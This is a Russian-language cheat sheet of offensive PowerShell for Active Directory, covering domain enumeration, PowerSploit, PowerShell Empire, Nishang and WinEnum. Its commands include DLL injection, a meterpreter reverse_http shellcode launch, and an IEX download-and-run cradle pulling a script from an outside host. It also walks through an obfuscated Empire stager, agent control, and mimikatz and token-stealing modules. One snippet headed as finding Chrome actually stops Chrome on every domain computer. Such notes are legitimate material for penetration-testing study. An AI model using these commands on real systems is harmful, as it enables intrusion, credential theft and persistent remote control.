#powershell #windows #AD

# Стандартные средства

Обратный системный DNS запрос
```powershell
[System.Net.Dns]::GetHostEntry('10.10.10.10').HostName
```

Исследования домена
```powershell
$ADComputers = (Get-ADComputer -filter *).DNSHostName
```

Список установленных программ на компьютерах домена.
```powershell
Get-WindowsFeature | ? -Property "Installed" -EQ "Installed"
```


Выводим список компьютеров, где запущен процесс `Chrome`
```powershell
$ADComputers = (Get-ADComputer -filter *).DNSHostName
% ($i in $ADComputers) {
 
    Invoke-Command -computername $i {
        Get-Process -Name "Chrome" | Stop-Process -ErrorAction SilentlyContinue
    } 
 }
```


Узнаем на которых компьютерах установлена `Java`
```powershell
$ADComputers = (Get-ADComputer -filter *).DNSHostName
foreach ($i in $ADComputers) {
 
    Invoke-Command -computername $i {
        gcim win32_product -computername $env:computername | Select-String -Pattern "Java" -AllMatches | Sort-Object -property Vendor,Name | Format-Table -ErrorAction SilentlyContinue
    } 
}
```

# PowerSploit

Начало работы
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process  # Разрешение
Import-Module .\PowerSploit\PowerSploit.psm1                # Импорт
```

Список основных командлетов фреймворка для AD:

| `Get-NetDomain -Domain jet.lab`                 | Получить данные о текущем домене.                                                             |
| ----------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `Get-DomainSID`                                 | Получить _SID_ текущего домена.                                                               |
| `Get-NetDomainController -Domain jet.lab`       | Получить список контроллеров домена.                                                          |
| `Get-NetUser -Domain jet.lab -UserName labuser` | Получить список пользователей домена.                                                         |
| `Get-NetGroup *group_name*`                     | Получить список групп домена.                                                                 |
| `Get-NetGroupMember -GroupName «Domain Admins»` | Получить список пользователей группы.                                                         |
| `Get-NetGroup -UserName «domain_user»`          | Получить список групп пользователя.                                                           |
| `Get-NetComputer -FullData`                     | Получить список компьютеров домена.                                                           |
| `Find-LocalAdminAccess -Verbose`                | Получить список компьютеров домена, где текущий пользователь локальный админ.                 |
| `Get-NetSession -ComputerName dc02.jet.lab`     | Получить список сессий компьютера.                                                            |
| `Invoke-UserHunter -CheckAccess`                | Найти все компьютеры, где залогинен Администратор домена и текущий пользователь имеет сессию. |

## Оглавление
- [[#Критические команды]]
- [[#Скачиваем и устанавливаем _Empire_:]]
  - [[#Для закрепления в системе необходимо:]]
- [[#Демонстрация работы]]

---

## Критические команды

Инжектирование кода в процесс
```powershell
Invoke-DllInjection -ProcessID 4274 -Dll injects/evil.dll
```

Запуск сессии `meterpreter`
```powershell
Invoke-Shellcode -Payload win/meterpreter/reverse_http -lhost 10.10.1.12 -lport 4444 -Force
```

После этого можно поднять сервер и отправить такую конструкцию
```powershell
IEX(New-Object Net.WebClient).DownloadString ("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1 ")
```

# PowerShell Empire

Установка [форк от BC-SECURITY](https://github.com/BC-SECURITY/Empire)

ПЕРЕД ИСПОЛЬЗОВАНИЕМ
Используем решим обфускации
```powershell
preobfuscate
```

Основные функции _Empire_ (чаще всего используемые):

- `sysinfo` — предоставляет информацию о системе на удалённом хосте.
- `download/upload` — позволяет загрузить файлы на удалённый хост или с него.
- `psinject` — внедряет агент в другой процесс.
- `sleep` — устанавливает интервал обмена сообщениями с агентом.
- `shell [cmd]` — позволяет выполнить команду через `cmd.exe`.
- `creds` — локальное хранилище учётных данных (паролей, хешей), предоставляет оперативную работу с ними. Хеши заполняются автоматически при использовании разных модулей, но также возможно их ручное добавление и удаление.
- `ps` — выводит список процессов с указанием имени процесса, его _PID_, пользователя, в контексте которого работает процесс, и занимаемую процессом память.
- `steal_token` — модуль имперсонации токена доступа.
- `scriptimport` — позволяет загрузить _PowerShell_-скрипт в память.
- `mimikatz` — простое и быстрое выполнение `sekurlsa::logonpasswords`.

Для подключения доп модуля
`usemodule`

Для поиска модулей 
`searchmodule`

## Скачиваем и устанавливаем _Empire_:

```powershell
git clone https://github.com/BC-SECURITY/Empire
cd Empire/setup
./install.sh
```

В конце работы скрипта мы должны увидеть `Setup complete!`
```powershell
./setup_database.py
./cert.sh
```

### Для закрепления в системе необходимо:

1. Создать _Listener_, который будет ожидать обратное соединение с машины-жертвы.
2. Создать _Stager_-загрузчик для _Listener_. С помощью него будет загружаться полезная нагрузка на атакуемую машину.
3. Запустить нагрузку и агента на машине-жертве.

## Демонстрация работы

Традиционное решение обычный _HTTP_-листенер. Выбираем его, дописывая команду:
```powershell
(Empire:listeners) > uselistener http
```

После этого можно получить справку по листенеру командой `info`:
```powershell
(Empire:uselistener/http) > info
```
Обратите внимание на параметры, которые по желанию можно настроить для листенеров: время работы и _SSL_-сертификат для _HTTPS_.

Задаются параметры командами `Set`:
```powershell
set Name List1
set Port 1237
```
Запустить можно командой `execute`.

После этого в разделе `listeners` можно увидеть запущенные листенеры.

Аналогично выбираем и настраиваем `Stager`:
```powershell
usestager
```
_Tab_ покажет доступные варианты под каждый тип операционных систем.

Классическим является стейджер `launcher`. Выбираем, например, `launcher_bat` для создания `bat`-файла:
```powershell
usestager windows/launcher_bat
```
Просматриваем список доступных параметров командой `info`. Зададим связь с листенером и укажем путь для сохранения:
```powershell
set Listener List1
set OutFile /home/list1.bat
execute
```

После загрузки всех скриптов атакующему дополнительно будет инициировать обфускацию командой:
```powershell
set Obfuscate true
```

Как только на атакуемой машине будет запущен созданный файл, атакующий получает сообщение об установлении сеанса. После этого переходим в раздел агентов и запускаем интерфейс управления:
```powershell
agents
```

В столбце `Name` указано имя агента, его можно переименовать командой `rename`. Запуск интерфейса управления осуществляется командой:
```powershell
interact <agent_Name>
```
Теперь можно начинать эксплуатацию.

Выбираем модуль для атаки командой `usemodule` и клавишей _Tab_.

Стоит отметить, что для доставки пейлоада на атакуемый хост в фреймворке предусмотрен _API_ и S_ocketIO_-сервер, который можно предварительно запустить командой:
```powershell
sudo poetry run python empire.py server
```

# Nishing [here](https://github.com/SkillfactoryCoding/HACKER-OS-nishang)


Справка доступна по команде:

```powershell
Get-Help nishang
```

Список команд:
```powershell
Get-Command -Module nishang
```

К примеру, _Nishang_ позволяет генерировать готовые пейлоады командами серии `Out-`. Например, `Out-Word` генерирует вредоносный `.doc`-файл.

Код полезной нагрузки указываем в качестве аргумента команды `Out-Word`. Созданный документ находится в папке модуля.

# Winenum

[Модуль](https://github.com/SkillfactoryCoding/HACKER-OS-WinEnum) сканирования и перечисления информации о системе.

Базовую информацию можно получить командлетом:
```powershell
Check-General
```

Другие полезные командлеты модуля:

- `Check-isVirtual`
- `Check-LocalAdmins`
- `Check-Domain`
- `Check-SecurityUpdates`
- `Check-AlwaysInstallElevated`
- `Check-UnquotedServicePath`
- `Check-ServiceExecutablePermissions`
- `Check-GeneralPasswordFolders`
- `Check-ScheduledTaskExecutablePermissions`

Модуль также доступен в _Meteterpreter_ по команде: `run winenum` или `run remotewinenum`. Отчёт будет заботливо сложен в папку логов конкретного модуля, например: `.msf4/logs/remotewinenum/`

